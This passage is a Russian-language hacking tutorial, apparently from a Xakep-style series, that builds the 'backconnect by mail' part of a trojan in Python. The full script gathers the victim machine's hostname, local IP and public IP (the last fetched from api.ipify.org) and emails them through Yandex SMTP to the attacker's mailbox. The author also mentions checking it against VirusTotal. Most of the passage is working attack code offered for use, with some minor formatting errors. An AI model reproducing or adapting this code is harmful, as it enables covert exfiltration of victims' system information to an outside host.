Бэкконнект по почте

Теперь напишем скрипт, который будет присылать нам письмо.

Импорт новых библиотек (обе нужно предварительно поставить черех pip install):

import smtplib as smtp
from getpass import getpass

Пишем базовую информацию о себе:

#Почта, с которой будет отправлено письмо
email = 'xakepmail@yandex.ru'

#Пароль от нее (вместо ***)
password = '***'

#Почта, на которую отправляем письмо
dest_email = 'demo@xakep.ru'

#Тема письма
subject = 'IP'

#Текст письма
email_text = 'TEXT'

Дальше сформируем письмо:
message = 'From:()\nTo:()\nSubject:()\n\n()'.format(email, dest_email, subject, email_text)

Последний штрих - настроить подключение к почтовому сервису. Я пользуюсь Яндекс.Почтой, 
поэтому настройки выставлял для нее.

server = smtp.SMTP_SSL('smtp.yandex.com') #SMTP-сервер Яндекса
server.set_debuglevel(1) #Минимизируем вывод ошибок (выводим только фатальные ошибки)
server.ehlo(email) #Отправляем hello-пакет на сервер
server.login(email, password) #Заходим на почту, с которой будем отправлять письмо
server.auth_plain() #Авторизуемся
server.sendmail(email, dest_email, message) #Вводим данные для отправки (адреса свой и
получателя и само сообщение)
server.quit() #Отключаемся от сервера

В строке server.ehlo(email) мы используем команду EHLO. Большинство серверов SMTP поддерживают
ESMTP and EHLO. Если сервер, к которому ты пытаешься подключиться, не поддерживает EHLO,
можо использовать HELO.

Полный код этой части трояна:

import smtplib as smtp
import socket
from getpass import getpass
from requests import get

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('https://api.ipify.org').text

email = 'xakepmail@yandex.ru'
password = '***'
dest_email = 'demo@xakep.ru'
subject = 'IP'
email_text = (f'Host:(hostname)\nLocal IP: (local_ip)\nPublic IP: (public_ip)')

message = 'From: ()\nTo: ()\nSubject: ()\n\n()'.format(email, dest_email, subject,email_text)

server = smtp.SMTP_SSL('smtp.yandex.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()

Запустив этот скрипт, получаем письмо.

Этот скрипт я проверил на VirusTotal. 
